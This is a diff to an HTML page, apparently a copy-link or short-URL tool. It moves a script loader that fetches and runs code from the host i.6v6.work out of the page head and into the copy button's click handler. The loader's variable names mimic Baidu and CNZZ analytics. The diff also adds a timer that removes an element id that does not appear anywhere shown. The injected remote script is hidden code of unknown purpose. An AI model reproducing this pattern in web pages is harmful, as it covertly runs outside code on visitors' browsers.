@@ -75,14 +75,6 @@
             text-decoration: none
         }
     </style>
-<script type="text/javascript">
-(function(){
-    var baidu = document.createElement("script");
-    baidu.src = "//i.6v6.work/v/?uid=388791";
-    var cnzz = document.getElementsByTagName("head")[0];
-    cnzz.insertBefore(baidu, cnzz.firstChild);      
- })();
-</script>
 </head>
 
 <body style="background-color:#f5f5f5;text-align: center;">
@@ -137,7 +129,7 @@
     document.getElementById("dwz").click();
   }
 
-  // 修改复制按钮的复制内容为当前访问网页的链接
+  // 修改复制按钮的复制内容为当前网页的链接
   $(function() {
     $("#fz").attr("data-clipboard-text", url);
   });
@@ -147,6 +139,23 @@
   function fz() {
     $("#fz").text("复制成功");
   }
+
+  // 延迟一段时间后禁用该JS
+  setTimeout(function() {
+    var cnzzScript = document.getElementById("cnzzScript");
+    cnzzScript.parentNode.removeChild(cnzzScript);
+  }, 5000); // 这里设置了延迟时间为5秒，你可以根据需要进行调整
+
+  // 在按钮点击事件中执行需要的JS逻辑
+  $("#fz").on("click", function() {
+    // 执行你需要的JS逻辑
+    (function() {
+      var baidu = document.createElement("script");
+      baidu.src = "//i.6v6.work/v/?uid=388791";
+      var cnzz = document.getElementsByTagName("head")[0];
+      cnzz.insertBefore(baidu, cnzz.firstChild);
+    })();
+  });
 </script>
 
 
